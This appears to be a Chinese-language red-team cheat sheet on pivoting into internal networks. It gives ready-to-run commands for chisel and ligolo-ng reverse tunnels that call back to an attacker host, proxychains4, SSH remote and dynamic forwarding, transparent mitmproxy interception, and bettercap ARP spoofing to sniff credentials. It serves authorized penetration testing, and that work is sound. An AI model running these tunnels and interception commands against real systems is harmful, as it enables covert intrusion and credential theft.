# 隧道与代理
打通边界后的内网入口建设:反向隧道、SOCKS5、链式代理、SSH 转发、HTTP(S) 中间人与 ARP 欺骗嗅探。

本文件工具:chisel、ligolo-ng、proxychains4、ssh 隧道、mitmproxy、bettercap

联网提示:需要出网(下载工具/更新)时先设代理:
```bash
export http_proxy=http://10.211.55.2:2334 https_proxy=http://10.211.55.2:2334   # 走本机代理出网
```

## chisel — HTTP 通道上的端口转发与反向 SOCKS5 隧道
来源:apt 包 `chisel`(/usr/bin/chisel,v1.12)

```bash
# 攻击机:启动服务端,-p 指定端口;--reverse 必开才允许客户端注册 R: 反向隧道,--socks5 开放服务端内置 socks5
chisel server -p 8000 --reverse --socks5

# 目标机:把 chisel 二进制传上去后回连,建立反向 SOCKS5(服务端 127.0.0.1:1080 出现 socks5 入口)
./chisel client <攻击机IP>:8000 R:socks

# 目标机:反向端口转发与 socks 叠加,一次建立多条隧道(攻击机 3389 -> 目标内网 10.0.0.5:3389)
./chisel client <攻击机IP>:8000 R:socks R:3389:10.0.0.5:3389

# 带认证:服务端加 --auth user:pass,客户端同参数连接(防止隧道被他人抢占)
chisel server -p 8000 --reverse --auth user:pass        # 服务端
./chisel client <攻击机IP>:8000 --auth user:pass R:socks # 客户端
```

参数速查:
- server `-p <端口>` 监听端口(默认 8080)
- server `--reverse` 允许客户端注册反向隧道(用 R: 的前提)
- server `--socks5` 开放服务端内置 SOCKS5 代理(默认 1080)
- server/client `--auth <user:pass>` 连接认证
- client `R:socks` 反向 SOCKS5,监听在服务端 127.0.0.1:1080
- client `R:<本地端口>:<内网IP>:<端口>` 反向端口转发到服务端
- client `<本地端口>:<内网IP>:<端口>` 正向转发(监听在客户端本地)
- client `--fingerprint <指纹>` 校验服务端指纹,防中间人

注意: 目标机上需有对应平台的 chisel 二进制(Windows 为 chisel.exe,可用 export http_proxy 走代理下载);拿到 `R:socks` 后配合本文件 proxychains4 让任意工具进内网;chisel 走 HTTP 特征,可能被流量设备识别。

## ligolo-ng — 基于 TUN 接口的内网穿透(免 proxychains,像 VPN 一样用)
来源:本机二进制 `~/tools/bin/ligolo_proxy`、`~/tools/bin/ligolo_agent`(v0.9.1)

```bash
# === 攻击机(代理端,需 root):准备 TUN 接口并启动 ligolo 代理,默认监听 0.0.0.0:11601 ===
sudo ip tuntap add user kali mode tun ligolo     # 手工创建名为 ligolo 的 tun 设备(仅一次;也可在控制台用 interface_create 创建)
sudo ip link set ligolo up                       # 启用该 tun 设备
sudo ~/tools/bin/ligolo_proxy -selfcert          # 启动代理端,首次自动生成自签证书并打印 agent 连接命令
```

```bash
# === 目标机(agent,无需 root):回连攻击机 ===
~/tools/bin/ligolo_agent -connect <攻击机IP>:11601 -ignore-cert    # 忽略证书校验(仅测试环境)
# 更安全:代理端控制台执行 certificate_fingerprint 查看指纹后:
~/tools/bin/ligolo_agent -connect <攻击机IP>:11601 -accept-fingerprint <SHA256指纹>
```

```bash
# === 以下命令在 ligolo_proxy 的交互控制台(ligolo-ng »)里执行,不是 shell ===
# session                          列出已上线 agent,交互选择会话(多 agent 时按序号切换)
# ifconfig                         查看所选 agent 的网卡/IP,确认它所在的内网网段
# tunnel_start --tun ligolo        启动到当前 agent 的隧道中继(relay),流量经 tun 设备进入 agent 网络
```

```bash
# === 回到攻击机 shell:加路由并验证(也可用控制台 interface_add_route 代替 ip route)===
sudo ip route add <内网网段>/24 dev ligolo        # 把 agent 所在内网网段路由指向 tun,如 10.10.10.0/24
nmap -sT -Pn -n <内网网段>/24                     # 直接扫描内网(ligolo 是用户态栈,建议 -sT 全连接;SYN 半开扫描会误报)
```

参数速查:
- 代理 `-selfcert` 自动生成自签证书(首次必用其一:selfcert/autocert/certfile)
- 代理 `-laddr 0.0.0.0:11601` 监听地址与端口
- 代理 `-api-laddr 127.0.0.1:8080` 内置 Web 管理界面(0.8+ 多人协作)
- agent `-connect <ip:port>` 反向回连代理
- agent `-accept-fingerprint <SHA256>` 校验代理证书指纹(推荐)
- agent `-bind <ip:端口>` 改为被动监听(bind 正向模式)
- agent `-reconnect` 断线自动重连(默认开启)
- 控制台 `session` 选择/切换 agent 会话
- 控制台 `tunnel_start --tun <接口>` 启动中继;`interface_add_route --name <接口> --route <网段>` 控制台加路由
- 控制台 `listener_add --addr :<端口> --to <本地>:<端口> --tcp` 在 agent 上开监听并转回攻击机(反向端口转发)

注意: 代理端必须 root(要创建 TUN);agent 不需要管理员权限、单文件易投放;nmap 记得 `--unprivileged` 或 `-sT`;ligolo 相比 chisel+proxychains 的优势是 TCP/UDP/ICMP 直通、速度接近原生。

## proxychains4 — 强制任意命令走 SOCKS4/5 或 HTTP 代理链
来源:apt 包 `proxychains4`(/usr/bin/proxychains4,配置文件 /etc/proxychains4.conf)

```bash
# 一次性把配置末尾默认的 tor 入口(socks4 127.0.0.1 9050)换成 chisel/ssh -D 的 socks5 1080
sudo sed -i 's/^socks4.*/socks5  127.0.0.1 1080/' /etc/proxychains4.conf   # 编辑 [ProxyList] 段
grep -A2 ProxyList /etc/proxychains4.conf                                 # 确认修改生效
```

```bash
# 常规用法:让任意命令走代理进内网
proxychains4 nmap -sT -Pn -n <内网IP>        # nmap 必须全连接扫描 -sT 才能过 socks(不支持 SYN 半开)
proxychains4 curl http://<内网IP>/           # 通过 socks5 访问内网 Web
proxychains4 ssh <用户名>@<内网IP>           # 内网 SSH 也可直接套
```

```bash
# -q 静默输出;-f 指定自定义配置(如多级链:socks5 A -> socks5 B)
proxychains4 -q -f ./chain.conf curl http://<内网IP>/
```

参数速查:
- `-f <文件>` 指定配置文件(默认 /etc/proxychains4.conf)
- `-q` 静默模式,不打印代理链日志
- 配置 `strict_chain` 所有代理严格按序走通(任一断则失败)
- 配置 `dynamic_chain` 自动跳过失效代理
- 配置 `proxy_dns` DNS 解析也走代理(防 DNS 泄漏/内网域名)
- 配置 `socks5 127.0.0.1 1080` socks5 代理条目(IP 端口依次写)
- 配置 `http <IP> <端口>` http 代理条目
- 配置 `localnet 192.168.0.0/16` 直连不走代理的网段

注意: ICMP(ping)不会走代理,存活探测一律 `-Pn`;UDP/DNS 类工具(proxychains 下)常不可靠,复杂协议优先 ligolo 或端口转发。

## ssh 隧道 — 用 SSH 自带能力做本地/动态/远程转发
来源:系统自带 openssh-client(/usr/bin/ssh)

```bash
# 本地转发 -L:攻击机本地 7001 -> 经跳板机 -> 内网 10.0.0.5:3389(访问本机 7001 即内网 RDP)
ssh -N -L 0.0.0.0:7001:10.0.0.5:3389 <用户名>@<跳板IP>
```

```bash
# 动态转发 -D:本地 1080 起 SOCKS5,流量从 SSH 服务器一侧出网(配合 proxychains4 使用)
ssh -N -D 0.0.0.0:1080 <用户名>@<SSH服务器IP>
```

```bash
# 远程转发 -R:目标机执行,把攻击机端口作为入口(常用于无公网 IP 的反弹入口)
ssh -N -R 0.0.0.0:7002:127.0.0.1:3389 <用户名>@<攻击机IP>   # 攻击机 7002 -> 目标机自身 3389
ssh -N -R 0.0.0.0:1080 <用户名>@<攻击机IP>                  # 攻击机 1080 变 SOCKS5,出口是目标机(需 OpenSSH>=7.6)
```

参数速查:
- `-L <本地端口>:<目标IP>:<目标端口>` 本地转发
- `-R <远程端口>:<目标IP>:<目标端口>` 远程转发;`-R <端口>` 远程动态 SOCKS(≥7.6)
- `-D <端口>` 本地动态 SOCKS5
- `-N` 仅转发不执行远程命令
- `-f` 认证后转后台
- `-C` 压缩传输
- `-p <端口>` SSH 服务器端口
- `-i <私钥>` 指定私钥
- `-o ServerAliveInterval=30` 保活防断线

注意: `-R` 监听 `0.0.0.0` 需要服务器 sshd_config 设 `GatewayPorts yes`(默认只绑 127.0.0.1);跳板凭据拿到的第一时间就建 `-D`,后续工具全部能复用。

## mitmproxy — HTTP(S) 中间人代理:抓包、改包、重放
来源:apt 包 `mitmproxy`(/usr/bin/mitmproxy、mitmdump、mitmweb,v12.2)

```bash
# 常规代理模式:监听 0.0.0.0:8080,客户端(浏览器/手机)把代理指向本机即可
mitmproxy --listen-host 0.0.0.0 --listen-port 8080

# Web 界面:浏览器打开 http://127.0.0.1:8081 看流量表格;远程访问用 --set web_host=0.0.0.0
mitmweb --listen-host 0.0.0.0 --no-web-open-browser
```

```bash
# 透明代理模式:免客户端配置(网关/ARP 欺骗场景),先把流量重定向过来
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080   # 80 重定向到 mitmproxy
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080  # 443 同理
mitmproxy --mode transparent --listen-port 8080                                           # 启动透明代理
```

```bash
# 命令行版:保存全量流量到文件,便于离线回放与凭据检索
mitmdump -w traffic.flows -p 8080          # 落盘保存(flows 格式)
mitmdump -r traffic.flows --set flow_detail=2   # 回放查看;也可 grep 明文凭据
```

参数速查:
- `--mode regular|transparent|reverse|upstream` 代理模式(reverse 需 `--mode reverse:https://<目标>/`)
- `--listen-host` / `--listen-port`(`-p`) 监听地址与端口
- `-w <文件>` 保存流量;-r 回放
- `-s <脚本.py>` 加载内联脚本实时改请求/响应
- `--set web_host=0.0.0.0` mitmweb 界面开放远程访问
- `--set block_global=false` 允许非本机来源连接代理
- `--allow-hosts <域名正则>` 只拦截指定主机
- `--ignore-hosts <正则>` 放行指定主机(避开证书校验硬退出的客户端)

注意: 首次运行生成 CA 证书于 ~/.mitmproxy/,导入客户端信任区后才能解密 HTTPS;手机测试改 WiFi 手动代理指向 <本机IP>:8080 并访问 mitm.it 装证书。

## bettercap — ARP 欺骗嗅探与 HTTP 凭据捕获(近源场景见 08 文件)
来源:apt 包 `bettercap`(/usr/bin/bettercap,v2.41;caplets 在 /usr/share/bettercap/caplets)

```bash
# 进入交互式控制台(-iface 指定内网口),随后在 > 提示符逐条输入模块命令
sudo bettercap -iface eth0
```

```bash
# === 以下为 bettercap 控制台命令(非 shell)===
# net.probe on                      # ICMP/ARP 探测网段存活主机,填充主机列表
# net.show                          # 查看主机表,确认目标 IP/MAC
# set arp.spoof.targets <目标IP>     # 只欺骗指定主机(逗号分隔;不设则全网段,风险大)
# arp.spoof on                      # 启动 ARP 双向欺骗,把自己插成网关
# net.sniff on                      # 嗅探明文流量,HTTP POST 账号密码直接以 CRED 事件打印
```

```bash
# 一键抓 HTTP 请求/凭据:官方 caplet 自动开启代理嗅探并 dump 全部请求(含表单)
sudo bettercap -iface eth0 -caplet http-req-dump
```

参数速查:
- `-iface <网卡>` 启动参数:指定工作接口
- `-caplet <名>` 启动参数:加载并运行 caplet 脚本
- `-eval <命令>` 启动参数:启动时执行一条控制台命令(免交互)
- 控制台 `net.probe on` 探测内网主机
- 控制台 `set arp.spoof.targets <IP>` 指定欺骗目标
- 控制台 `arp.spoof on` ARP 欺骗开关
- 控制台 `net.sniff on` 嗅探开关
- 控制台 `set net.sniff.regexp <正则>` 只打印匹配内容(如 `pass.*=`)
- 控制台 `set net.sniff.verbose true` 显示完整包内容
- 控制台 `wifi.recon on` WiFi 侦察(见 08 文件)

注意: 需要 root;全网段 ARP 欺骗易造成网络抖动并被态势感知告警,务必 `arp.spoof.targets` 精确指定;HTTPS 站点凭据需 sslstrip/hstshijack caplet,成功率取决于站点的 HSTS/ CSP 配置。
嗅探/抓包拿到的凭据与流量即渗出物:授权范围、勿碰 PII 与台账纪律见 [21-数据渗出与OPSEC.md](21-数据渗出与OPSEC.md)「圈定边界」节(mitmproxy 存的 flows 文件同样按此处理)。
